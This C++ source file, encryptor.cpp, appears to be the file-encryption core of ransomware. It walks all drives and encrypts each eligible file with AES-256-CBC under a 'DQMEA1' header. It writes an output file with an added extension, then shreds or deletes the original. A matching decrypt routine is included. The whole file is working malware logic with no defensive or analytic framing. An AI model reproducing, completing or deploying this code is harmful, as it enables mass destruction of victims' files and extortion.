// encryptor.cpp — Per-file encryption pipeline
#include "encryptor.h"
#include "targets.h"
#include "shredder.h"
#include "crypto/aes.h"
#include "crypto/hash.h"
#include "util/filesystem.h"
#include <cstring>
#include <vector>

namespace encryptor {

static EncryptConfig g_cfg = {0};
static bool g_initialized = false;

void init_encryption(const EncryptConfig& cfg) {
    g_cfg = cfg;
    g_initialized = true;
}

const EncryptConfig& get_config() { return g_cfg; }

bool encrypt_file(const std::wstring& path, const WIN32_FIND_DATAW& fd) {
    if (!g_initialized || !g_cfg.aes_key) return false;

    std::wstring ext = util::get_extension(path);
    if (!should_encrypt(path, ext)) return false;

    // Skip zero-byte files
    if (fd.nFileSizeHigh == 0 && fd.nFileSizeLow == 0) return false;
    uint64_t size = ((uint64_t)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
    if (size > (1ULL << 30)) return false; // Skip >1GB (stability)

    // Read plaintext
    std::vector<BYTE> plain;
    if (!util::read_file(path, plain) || plain.empty()) return false;

    // Encrypt: output = [IV (16)] [ciphertext]
    std::vector<BYTE> cipher;
    if (!crypto::aes256_cbc_encrypt(g_cfg.aes_key, plain.data(), plain.size(),
                                     NULL, cipher))
        return false;

    // Build output: [magic (6)] [orig_size (8)] [cipher]
    std::vector<BYTE> out;
    out.reserve(6 + 8 + cipher.size());
    out.insert(out.end(), (BYTE*)"DQMEA1", (BYTE*)"DQMEA1" + 6);

    uint64_t orig_size = plain.size();
    out.insert(out.end(), (BYTE*)&orig_size, (BYTE*)&orig_size + 8);
    out.insert(out.end(), cipher.begin(), cipher.end());

    // Write encrypted file
    std::wstring enc_path = path + g_cfg.extension;
    if (!util::write_file(enc_path, out)) {
        DeleteFileW(enc_path.c_str());
        return false;
    }

    // Original cleanup
    if (g_cfg.shred_original) {
        shred_file(path, 3);
    } else {
        DeleteFileW(path.c_str());
    }

    return true;
}

bool decrypt_file(const std::wstring& path, const BYTE key[32]) {
    std::vector<BYTE> raw;
    if (!util::read_file(path, raw)) return false;
    if (raw.size() < 14) return false;
    if (memcmp(raw.data(), "DQMEA1", 6) != 0) return false;

    uint64_t orig_size = 0;
    memcpy(&orig_size, raw.data() + 6, 8);

    const BYTE* cipher = raw.data() + 14;
    size_t cipher_len = raw.size() - 14;

    std::vector<BYTE> plain;
    if (!crypto::aes256_cbc_decrypt(key, cipher, cipher_len, plain))
        return false;

    if (plain.size() != orig_size) return false;

    // Strip .dqmea extension
    std::wstring orig_path = path;
    if (orig_path.size() > g_cfg.extension.size()) {
        orig_path = orig_path.substr(0, orig_path.size() - g_cfg.extension.size());
    }

    if (!util::write_file(orig_path, plain)) return false;
    DeleteFileW(path.c_str());
    return true;
}

WalkStats run_encryption_sweep(std::atomic<bool>& abort_flag) {
    WalkStats stats;

    auto cb = [&](const std::wstring& path, const WIN32_FIND_DATAW& fd) -> bool {
        if (abort_flag) return false;
        stats.files_seen++;
        if (encrypt_file(path, fd)) {
            stats.files_encrypted++;
            stats.bytes_encrypted += ((uint64_t)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
        } else {
            stats.files_skipped++;
        }
        return true;
    };

    walk_all_drives(cb, abort_flag);
    return stats;
}

} // namespace encryptor
